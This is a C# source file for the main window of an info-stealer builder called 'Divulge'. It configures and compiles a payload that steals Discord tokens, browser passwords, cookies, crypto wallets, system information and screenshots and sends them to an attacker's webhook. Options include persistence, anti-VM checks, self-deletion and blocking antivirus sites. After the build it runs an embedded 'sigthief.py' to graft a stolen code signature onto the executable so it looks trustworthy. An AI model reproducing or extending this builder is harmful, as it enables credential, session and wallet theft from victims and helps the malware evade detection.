﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;
using Divulge.builder.Components.Build;


namespace Divulge.builder.Components.Forms
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        [DllImport("user32.dll")]
        static extern private int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        [DllImport("user32.dll")]
        static extern private bool ReleaseCapture();

        private void Drag_On_Mousedown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, 0xA1, 0x2, 0);
            }
        }

        private void buttonClose_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void buttonMinimize_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void RefreshControls()
        {
            Settings.Webhook = txtWebhook.Text;


            Settings.Startup = chkStartup.Checked;
            Settings.AntiVm = chkAntiVm.Checked;
            Settings.Melt = chkMelt.Checked;
            Settings.BlockAvSites = chkBlockAvSites.Checked;

            Settings.StealDiscordTokens = chkDiscord.Checked;
            Settings.StealPasswords = chkPasswords.Checked;
            Settings.StealCookies = chkCookies.Checked;

            Settings.StealWallets = chkWallets.Checked;
            Settings.StealSystemInfo = chkSystemInfo.Checked;
            Settings.TakeScreenshot = chkWallets.Checked;

            var isWebhookValid = (Settings.Webhook.StartsWith("http://") || Settings.Webhook.StartsWith("https://")) && Settings.Webhook.Contains(".");
            btnBuild.Enabled = (Settings.StealDiscordTokens || Settings.StealPasswords || Settings.StealCookies || Settings.StealGames || Settings.StealTelegramSessions || Settings.StealSystemInfo || Settings.StealWallets || Settings.TakeScreenshot) && isWebhookValid;
        }

        private async void btnCheckWebhook_Click(object sender, EventArgs e)
        {
            if (txtWebhook.Text.Length == 0)
            {
                MessageBox.Show("Webhook cannot be empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
            }
            else if ((!txtWebhook.Text.StartsWith("https://") && !txtWebhook.Text.StartsWith("http://")) || !txtWebhook.Text.Contains("."))
            {
                MessageBox.Show("Webhook is invalid.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
            }
            else
            {
                btnCheckWebhook.Enabled = false;
                btnBuild.Enabled = false;
                txtWebhook.Enabled = false;

                try
                {
                    using (var client = new HttpClient())
                    {
                        var response = await client.GetAsync(txtWebhook.Text);
                        if (response.StatusCode == System.Net.HttpStatusCode.OK)
                        {
                            MessageBox.Show("The webhook is valid.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show("The webhook is invalid.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                        }
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show("Can not connect to webhook.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                }


                btnCheckWebhook.Enabled = true;
                txtWebhook.Enabled = true;
                RefreshControls();
            }
        }

        private void txtWebhook_TextChanged(object sender, EventArgs e)
        {
            RefreshControls();
        }

        private void CheckedChanged(object sender, Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs e)
        {
            RefreshControls();
        }

        private void btnIconSelect_Click(object sender, EventArgs e)
        {
            var tag = btnIconSelect.Tag as string;
            if (tag == "NoIcon")
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "Icon File (*.ico)|*.ico";
                    openFileDialog.Title = "Select Icon File";
                    openFileDialog.ValidateNames = true;
                    openFileDialog.CheckFileExists = true;
                    openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        if (File.Exists(openFileDialog.FileName))
                        {
                            Settings.IconPath = openFileDialog.FileName;
                            btnIconSelect.Tag = "Icon";
                            btnIconSelect.Text = "Unselect Icon";
                        }
                    }
                }
            }
            else
            {
                btnIconSelect.Tag = "NoIcon";
                Settings.IconPath = string.Empty;
                btnIconSelect.Text = "Select Icon";
            }
        }

        private void btnModifyAssembly_Click(object sender, EventArgs e)
        {
            new AssemblyEditorForm().ShowDialog();
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            using (var saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Executable File (*.exe)|*.exe";
                saveFileDialog.Title = "Save payload";
                saveFileDialog.FileName = "Divulge.exe";
                saveFileDialog.ValidateNames = true;

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    // Disable buttons during the process
                    btnBuild.Enabled = false;
                    btnCheckWebhook.Enabled = false;
                    btnModifyAssembly.Enabled = false;
                    btnIconSelect.Enabled = false;
                    txtWebhook.Enabled = false;

                    // Build the Divulge.exe
                    var builder = new Builder();
                    builder.Build(saveFileDialog.FileName); // Build the payload

                    // After the build process, apply the signature
                    ApplySignature(saveFileDialog.FileName);

                    // Re-enable the buttons after the process is complete
                    btnBuild.Enabled = true;
                    btnCheckWebhook.Enabled = true;
                    btnModifyAssembly.Enabled = true;
                    btnIconSelect.Enabled = true;
                    txtWebhook.Enabled = true;

                    MessageBox.Show("Divulge.exe built and signed successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void ApplySignature(string targetExePath)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable Files (*.exe)|*.exe";
                openFileDialog.Title = "Select an executable file from which to extract the digital signature.";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string donorExePath = openFileDialog.FileName;

                    // Run the Python script to extract the signature and append it to the target file
                    RunPythonScript(donorExePath, targetExePath);
                }
                else
                {
                    MessageBox.Show("No donor EXE selected.");
                }
            }
        }


        private void bunifuLabel1_Click(object sender, EventArgs e)
        {
            // Event handler for label click
        }

        private void bunifuShadowPanel2_ControlAdded(object sender, ControlEventArgs e)
        {
            // Event handler for control added to shadow panel
        }

        private void RunPythonScript(string donorExePath, string targetExePath)
        {
            string pythonScript = ExtractPythonScript();

            // Write the embedded Python script to a temp file
            string tempScriptPath = Path.Combine(Path.GetTempPath(), "sigthief.py");
            File.WriteAllText(tempScriptPath, pythonScript);

            ProcessStartInfo start = new ProcessStartInfo
            {
                FileName = "python",
                Arguments = $"\"{tempScriptPath}\" -i \"{donorExePath}\" -t \"{targetExePath}\" -a",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(start))
            {
                // Capture standard output and error
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                // Log the output and errors for debugging
                File.AppendAllText("python_output.txt", output);
                File.AppendAllText("python_error.txt", error);
            }

            // Rename the signed file to the original target file name
            string signedFilePath = targetExePath + "_signed";
            if (File.Exists(signedFilePath))
            {
                File.Delete(targetExePath);
                File.Move(signedFilePath, targetExePath);
            }
        }

        private static string ExtractPythonScript()
        {
            // Adjust the resource name according to the output from the previous step
            string resourceName = "Divulge.builder.Scripts.sigthief.py";

            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                if (stream == null)
                {
                    throw new FileNotFoundException($"Embedded resource '{resourceName}' not found.");
                }

                using (StreamReader reader = new StreamReader(stream))
                {
                    return reader.ReadToEnd();
                }
            }
        }
    }
}




